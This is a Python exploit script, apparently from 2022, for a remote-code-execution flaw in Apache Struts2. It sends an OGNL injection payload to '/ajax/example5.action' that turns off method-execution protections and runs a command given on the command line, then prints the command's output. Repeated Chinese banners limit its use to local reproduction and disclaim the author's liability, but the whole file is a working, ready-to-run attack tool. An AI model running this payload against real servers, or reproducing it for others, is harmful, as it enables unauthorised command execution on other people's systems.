# -*- encoding: utf-8 -*-
# Time: 2022/07/28 16:48
# Author: san1
import requests
import os
import sys

requests.packages.urllib3.disable_warnings()
def title():
  print('[+]  \033[31m警告: 漏洞仅限本地复现使用,请遵守网络安全法律法规,违者使用与本程序开发者无关    \033[0m')
  print('[+]  \033[31m警告: 漏洞仅限本地复现使用,请遵守网络安全法律法规,违者使用与本程序开发者无关    \033[0m')
  print('[+]  \033[31m警告: 漏洞仅限本地复现使用,请遵守网络安全法律法规,违者使用与本程序开发者无关    \033[0m')
  print('[+]  \033[31m警告: 如拼接命令ls /tmp 请用+连接(ls+/tmp)   \033[0m')
def exp_commod(host,commod):
  payload="/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]".format(commod)
  res=requests.get("{}{}".format(host,payload))
  #print("{}{}".format(host,payload))
  try:
    if res.status_code==200:
      print((res.content).replace(b'\x00',b''))
    else:
      print("[-] info: This link is not vulnerable.")
  except Exception as e:
    #print("[-] info: This link is not vulnerable.")
    a=1





if __name__== '__main__':
  title()
  if len(sys.argv) < 3:
    print('[+]  \033[36mfor example: https:127.0.0.1   whoami \033[0m')
  elif len(sys.argv) ==3:
    try:
      host=sys.argv[1]
      commod=sys.argv[2]
      exp_commod(host,commod)
    except Exception as e:
      print('[-] error')
      print('[-] error')





